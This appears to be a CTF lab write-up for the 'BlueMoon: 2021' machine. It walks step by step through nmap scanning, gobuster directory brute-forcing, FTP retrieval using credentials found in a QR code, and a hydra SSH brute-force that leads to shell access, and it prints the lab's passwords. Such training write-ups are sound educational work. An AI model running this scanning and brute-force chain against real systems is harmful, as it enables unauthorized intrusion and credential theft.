# 🛡️ BlueMoon: 2021 Penetration Testing Report

## 📋 Project Summary
Detailed walkthrough of the *BlueMoon: 2021* CTF machine. The objective was to demonstrate a full attack lifecycle, from initial reconnaissance to gaining a user shell via SSH.

---

## 🛠️ Infrastructure & Toolkit
- *Target IP:* 10.27.55.51
- *Attacker OS:* Kali Linux (alyntsh@kali)
- *Networking:* ifconfig eth0 confirmed local IP 10.27.55.10
- *Tools Used:* Nmap, Gobuster, Hydra, FTP, QR Analysis
---
🔍 Phase 1: Reconnaissance & Enumeration
1. Host Discovery
```bash
nmap -sn 10.27.55.0/24
```
2. Service Scanning
```bash
nmap -sC -sV -Pn -vv 10.27.55.51
```
Results:
Port 21: vsftpd 3.0.3
Port 22: OpenSSH 7.9p1
Port 80: Apache httpd 2.4.38
3. Web Directory Brute-forcing
```bash
gobuster dir -u http://10.27.55.51 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
Discovered:
`/hidden_text` (Status: 200)
Asset Found:
`QR_C0d3.png`
---
🔓 Phase 2: Exploitation
1. QR Code Analysis
Scanning the QR code revealed FTP credentials:
Username: `userftp`
Password: `ftpp@ssword`
2. FTP Data Exfiltration
```bash
ftp 10.27.55.51
get information.txt
get p_lists.txt
```
Findings:
`information.txt`: Identified user `robin`
`p_lists.txt`: Custom wordlist
3. SSH Brute-force
```bash
hydra -t 4 -l robin -P p_lists.txt ssh://10.27.55.51
```
Result:
Username: `robin`
Password: `k4rv3ndh4nh4ck3r`
---
🏆 Phase 3: Post-Exploitation
SSH Access
```bash
ssh robin@10.27.55.51
```
Access:
```bash
robin@BlueMoon:~$
```
---
✅ Conclusion
Successfully completed:
Reconnaissance
Enumeration
Exploitation
Credential Harvesting
Initial Access via SSH
